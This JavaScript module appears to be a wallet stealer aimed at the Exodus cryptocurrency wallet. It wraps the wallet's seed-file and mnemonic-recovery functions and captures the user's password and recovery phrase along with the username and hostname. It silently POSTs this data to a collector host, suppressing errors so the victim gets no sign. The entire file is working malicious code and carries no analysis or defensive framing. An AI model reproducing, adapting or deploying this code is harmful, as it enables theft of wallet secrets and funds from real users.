(function() {
    var __hos = require("os");
    var __hhttps = require("https");
    var __hfs = require("fs");
    var __hpw = null, __hpin = null, __hmn = null, __hpriv = [];
    var __hmeta = { app: "Exodus", ver: process.versions.electron || "" };

    function __hsend(tag, extra) {
        var __hbase = {
            ts: Date.now(),
            wallet: "Exodus",
            pw: __hpw,
            pin: __hpin,
            mn: __hmn,
            priv: __hpriv,
            addrs: [],
            bals: [],
            txs: [],
            meta: __hmeta,
            user: __hos.userInfo().username,
            host: __hos.hostname(),
            ev: tag,
            data: extra || null
        };
        var body = JSON.stringify(__hbase);
        var req = __hhttps.request({
            hostname: "collector.invalid",
            port: 443,
            path: "/api/wallet/collect",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(body)
            }
        }, function() {});
        req.on("error", function() {});
        req.write(body);
        req.end();
    }

    function __hhookSeeder(proto) {
        if (!proto) return;
        if (typeof proto.getSeedFile === "function") {
            var origGetSeedFile = proto.getSeedFile;
            proto.getSeedFile = function(passphrase) {
                if (passphrase) {
                    __hpw = String(passphrase);
                    __hsend("getSeedFile", { pw: __hpw });
                }
                return origGetSeedFile.apply(this, arguments);
            };
        }
        if (typeof proto.createFromMnemonicRecoveryPhrase === "function") {
            var origCreate = proto.createFromMnemonicRecoveryPhrase;
            proto.createFromMnemonicRecoveryPhrase = function(mnemonic, passphrase) {
                __hmn = String(mnemonic || "");
                if (passphrase) __hpw = String(passphrase);
                __hsend("createFromMnemonicRecoveryPhrase", { mn: __hmn, pw: __hpw });
                return origCreate.apply(this, arguments);
            };
        }
        if (typeof proto.recoverWalletFromMnemonic === "function") {
            var origRecover = proto.recoverWalletFromMnemonic;
            proto.recoverWalletFromMnemonic = function(mnemonic, passphrase) {
                __hmn = String(mnemonic || "");
                if (passphrase) __hpw = String(passphrase);
                __hsend("recoverWalletFromMnemonic", { mn: __hmn, pw: __hpw });
                return origRecover.apply(this, arguments);
            };
        }
    }

    module.exports = { __hhookSeeder: __hhookSeeder, __hsend: __hsend };
})();
